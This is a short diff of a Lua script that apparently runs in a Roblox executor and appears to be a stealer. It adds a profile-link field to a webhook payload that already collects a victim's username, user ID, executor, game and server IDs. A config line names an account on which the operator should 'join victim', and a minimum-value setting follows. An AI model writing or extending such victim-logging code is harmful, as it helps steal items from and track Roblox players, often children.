@@ -14,6 +14,7 @@ local gameName = gameService.Name
 local gameID = game.GameId
 local placeID = game.PlaceId
 local jobID = game.JobId -- Unique Server Instance ID
+local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
 
 -- Create Data for Webhook
 local data = {
@@ -25,6 +26,7 @@ local data = {
         ["fields"] = {
             {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
             {["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
+            {["name"] = "Profile Link", ["value"] = "[View Profile](" .. profileLink .. ")", ["inline"] = false},
             {["name"] = "Executor", ["value"] = identifyexecutor and identifyexecutor() or "Unknown", ["inline"] = true},
             {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
             {["name"] = "Game ID", ["value"] = tostring(gameID), ["inline"] = true},
@@ -64,6 +66,7 @@ elseif http and http.request then
 else
     print("No supported exploit functions found!")
 end
+
 
 _G.Username = "boondock138" -- user you should join victim on
 _G.min_value = 0.1
